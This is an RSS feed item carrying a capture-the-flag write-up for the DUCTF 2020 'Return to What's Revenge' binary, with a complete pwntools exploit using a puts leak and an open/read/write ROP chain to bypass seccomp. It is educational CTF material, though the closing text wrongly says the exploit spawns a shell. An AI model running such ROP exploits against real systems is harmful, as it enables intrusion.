<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ROP on Anvbis</title><link>https://anvbis.github.io/tags/rop/</link><description>Recent content in ROP on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Copyright 2020 Anvbis</copyright><lastBuildDate>Tue, 17 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/tags/rop/index.xml" rel="self" type="application/rss+xml"/><item><title>DUCTF 2020 :: Return to What's Revenge</title><link>https://anvbis.github.io/posts/ductf-2020-return-to-whats-revenge/</link><pubDate>Tue, 17 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/ductf-2020-return-to-whats-revenge/</guid><description>Reverse Engineering Running file tells us that the target binary is a 64-bit dynamically linked linux executable.
$ file ./return-to-whats-revenge ./return-to-whats-revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=85709e2a953fc6f7da43f29d1dee0c5cc682a059, with debug_info, not stripped We can run pwntools' checksec tool to get a better overview of the protections the target binary has in place. Note that the only protection in place is DEP, so we&amp;rsquo;ll likely have to build a ROP chain to bypass it.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>Running &lt;code>file&lt;/code> tells us that the target binary is a 64-bit dynamically linked linux executable.&lt;/p>
&lt;pre>&lt;code>$ file ./return-to-whats-revenge
./return-to-whats-revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=85709e2a953fc6f7da43f29d1dee0c5cc682a059, with debug_info, not stripped
&lt;/code>&lt;/pre>&lt;p>We can run pwntools' &lt;code>checksec&lt;/code> tool to get a better overview of the protections the target binary has in place. Note that the only protection in place is DEP, so we&amp;rsquo;ll likely have to build a ROP chain to bypass it.&lt;/p>
&lt;pre>&lt;code>$ checksec ./return-to-whats-revenge
[*] './return-to-whats-revenge'
Arch: amd64-64-little
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;p>Running the binary shows us that it simply prompts the user for input prior to exiting. It&amp;rsquo;s likely we&amp;rsquo;ll find a vulnerability of some sort where it takes user input.&lt;/p>
&lt;pre>&lt;code>$ ./return-to-whats-revenge
Today, we'll have a lesson in returns.
Where would you like to return to?
asdf
&lt;/code>&lt;/pre>&lt;p>Disassembling the executable shows us that it contains two important functions. The &lt;code>main&lt;/code> function calls a function called &lt;code>vuln&lt;/code>. The &lt;code>vuln&lt;/code> function makes a &lt;code>gets&lt;/code> call with a stack variable, so we&amp;rsquo;ve found a stack buffer overflow.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">vuln&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>s;
puts(&lt;span style="color:#e6db74">&amp;#34;Where would you like to return to?&amp;#34;&lt;/span>);
gets(&lt;span style="color:#f92672">&amp;amp;&lt;/span>s);
&lt;span style="color:#66d9ef">return&lt;/span>;
}
undefined8 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
puts(&lt;span style="color:#e6db74">&amp;#34;Today, we&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">ll have a lesson in returns.&amp;#34;&lt;/span>);
vuln();
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Running &lt;code>strace&lt;/code> on the binary shows us that (at some point prior to taking user input) instantiates several &lt;code>seccomp&lt;/code> rules, so not only will we have to build a ROP chain, we&amp;rsquo;ll have to work within the &lt;code>seccomp&lt;/code> jail.&lt;/p>
&lt;pre>&lt;code>$ strace ./return-to-whats-revenge
...
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=25, filter=0x7fff935ea670}) = 0
...
&lt;/code>&lt;/pre>&lt;p>We can use a wonderful tool called &lt;code>seccomp-tools&lt;/code> to dump the &lt;code>seccomp&lt;/code> rules that the binary operates under. Note that the binary allows the &lt;code>open&lt;/code>, &lt;code>read&lt;/code>, and &lt;code>write&lt;/code> syscalls - so we should be able to build a ROP chain that opens, reads, and writes the flag to &lt;code>stdout&lt;/code>.&lt;/p>
&lt;pre>&lt;code>$ seccomp-tools dump ./return-to-whats-revenge
line CODE JT JF K
=================================
0000: 0x20 0x00 0x00 0x00000004 A = arch
0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003
0002: 0x06 0x00 0x00 0x00000000 return KILL
0003: 0x20 0x00 0x00 0x00000000 A = sys_number
0004: 0x15 0x00 0x01 0x0000000f if (A != rt_sigreturn) goto 0006
0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0006: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0008
0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010
0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0010: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0012
0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0012: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0014
0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0014: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0016
0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0016: 0x15 0x00 0x01 0x0000000c if (A != brk) goto 0018
0017: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0018: 0x15 0x00 0x01 0x00000009 if (A != mmap) goto 0020
0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0020: 0x15 0x00 0x01 0x0000000a if (A != mprotect) goto 0022
0021: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0022: 0x15 0x00 0x01 0x00000003 if (A != close) goto 0024
0023: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0024: 0x06 0x00 0x00 0x00000000 return KILL
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s use &lt;code>readelf&lt;/code> to get the address of the binary&amp;rsquo;s &lt;code>.data&lt;/code> section, we&amp;rsquo;ll want to use it to store our &lt;code>flag.txt&lt;/code> string that we use in the &lt;code>open&lt;/code> syscall of our ROP chain.&lt;/p>
&lt;pre>&lt;code>$ readelf --sections ./return-to-whats-revenge
..
[22] .data PROGBITS 0000000000404000 00003000
0000000000000010 0000000000000000 WA
...
&lt;/code>&lt;/pre>&lt;p>Earlier we noticed that the binary uses &lt;code>puts&lt;/code>, we can use this to perform a simple &lt;code>puts(puts)&lt;/code> style leak to obtain the an address in &lt;code>libc&lt;/code>. Let&amp;rsquo;s find the offset of &lt;code>puts&lt;/code> from the base of &lt;code>libc&lt;/code>. We&amp;rsquo;ll want to use this later to find the base address of &lt;code>libc&lt;/code>.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; info proc map
process 1461
Mapped address spaces:
Start Addr End Addr Size Offset objfile
...
0x7ffff7def000 0x7ffff7e14000 0x25000 0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
pwndbg&amp;gt; p puts
$2 = {int (const char *)} 0x7ffff7e655f0 &amp;lt;__GI__IO_puts&amp;gt;
pwndbg&amp;gt; p/x 0x7ffff7e655f0-0x7ffff7def000
$3 = 0x765f0
&lt;/code>&lt;/pre>&lt;p>Lastly, we just need to find a bunch of different ROP gadgets in order to perform our exploit. These are mostly just &lt;code>pop reg; ret&lt;/code> instructions that we can use to move values into the registers we need to perform syscalls, and a &lt;code>syscall&lt;/code> instruction that&amp;rsquo;ll allow us to execute our &lt;code>open&lt;/code>, &lt;code>read&lt;/code>, and &lt;code>write&lt;/code> syscalls.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./return-to-whats-revenge --search 'pop rdi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi
[INFO] File: ./return-to-whats-revenge
0x00000000004019db: pop rdi; ret;
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ ropper --file ./return-to-whats-revenge --search 'pop rsi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rsi
[INFO] File: ./return-to-whats-revenge
0x00000000004019d9: pop rsi; pop r15; ret;
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'pop rdx'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdx
[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x00000000000cb1cd: pop rdx; ret;
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'pop rax'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rax
[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x000000000003ee88: pop rax; ret;
...
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'syscall'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: syscall
[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x00000000000580da: syscall; ret;
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>The only bit of information we now need to gather is the offset of the return address from our input buffer.&lt;/p>
&lt;p>Here&amp;rsquo;s a quick script that&amp;rsquo;ll attach the process to GDB before sending a large cyclic pattern of bytes to it, allowing us to find the offset of the return address from our input buffer.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./return-to-whats-revenge&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">300&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After continuing in GDB and letting the program crash, we can see what was stored in the return address.&lt;/p>
&lt;pre>&lt;code> ► 0x4011d9 &amp;lt;vuln+39&amp;gt; ret &amp;lt;0x6161616161616168&amp;gt;
&lt;/code>&lt;/pre>&lt;p>We can use pwntools' &lt;code>cyclic_find&lt;/code> function to calculate the offset of the return address from the start of our input buffer (using the value stored in the return address we found above).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616161616168&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">56&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>Now that we have everything we need, we can start to write our exploit. There&amp;rsquo;s a lot of things we&amp;rsquo;ll need to achieve (leaks, etc), so here&amp;rsquo;s a brief summary of what we want to do:&lt;/p>
&lt;ul>
&lt;li>Overwrite the return address to gain control of process execution.&lt;/li>
&lt;li>Perform a &lt;code>puts(puts)&lt;/code> leak to obtain an address in &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>Calculate the base address of &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>Return back to &lt;code>main&lt;/code> so we can perform the second stage of our exploit.&lt;/li>
&lt;li>Build a ROP chain that opens, reads, and writes the contents of &lt;code>flag.txt&lt;/code>.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> time
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>clear(arch&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>)
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">return-to-whats-revenge
&lt;/span>&lt;span style="color:#e6db74">0x00000000004019db: pop rdi; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4019db&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">return-to-whats-revenge
&lt;/span>&lt;span style="color:#e6db74">0x00000000004019d9: pop rsi; pop r15; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rsi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4019d9&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">libc-3.1.so
&lt;/span>&lt;span style="color:#e6db74">0x00000000000cb1cd: pop rdx; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rdx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0cb1cd&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">libc-3.1.so
&lt;/span>&lt;span style="color:#e6db74">0x000000000003ee88: pop rax; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rax &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x03ee88&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">libc-3.1.so
&lt;/span>&lt;span style="color:#e6db74">0x00000000000580da: syscall; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
syscall &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0580da&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./return-to-whats-revenge&amp;#39;&lt;/span>)
elf &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-whats-revenge&amp;#39;&lt;/span>)
rop &lt;span style="color:#f92672">=&lt;/span> ROP(elf)
rop&lt;span style="color:#f92672">.&lt;/span>raw(pop_rdi)
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>got[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#75715e"># pop rdi ; got.puts&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>plt[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>])
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;main&amp;#39;&lt;/span>])
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain())
leak &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>readline()[:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]
leak &lt;span style="color:#f92672">=&lt;/span> unpack(leak, len(leak) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>)
libc &lt;span style="color:#f92672">=&lt;/span> leak &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x765f0&lt;/span>
rop &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;span style="color:#75715e"># read(.data, stdin, 9)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">0&lt;/span>, pop_rsi, &lt;span style="color:#ae81ff">0x404000&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rdx, &lt;span style="color:#ae81ff">9&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall,
&lt;span style="color:#75715e"># open(&amp;#34;flag.txt&amp;#34;, 0, 0)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">0x404000&lt;/span>, pop_rsi, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rdx, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">2&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall,
&lt;span style="color:#75715e"># read(3, .data+0x10, 35)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">3&lt;/span>, pop_rsi, &lt;span style="color:#ae81ff">0x404010&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rdx, &lt;span style="color:#ae81ff">35&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall,
&lt;span style="color:#75715e"># write(stdout, .data+0x10, 35)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">1&lt;/span>, pop_rsi, &lt;span style="color:#ae81ff">0x404010&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rdx, &lt;span style="color:#ae81ff">35&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">1&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall,
&lt;span style="color:#75715e"># exit(0)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">60&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall
)
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> rop)
r&lt;span style="color:#f92672">.&lt;/span>writeline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;flag.txt&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>readuntil(&lt;span style="color:#e6db74">&amp;#39;Where would you like to return to?&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
print(r&lt;span style="color:#f92672">.&lt;/span>readall())
r&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action. It spawns an interactive shell that we can use to retrieve the flag.&lt;/p>
&lt;pre>&lt;code>$ ./exploit.py
[+] Starting local process './return-to-whats-revenge': pid 2683
[*] './return-to-whats-revenge'
Arch: amd64-64-little
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
[*] Loaded 14 cached gadgets for './return-to-whats-revenge'
Today, we'll have a lesson in returns.
Where would you like to return to?
DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}
[*] Stopped process './return-to-whats-revenge' (pid 2683)
&lt;/code>&lt;/pre></content></item></channel></rss>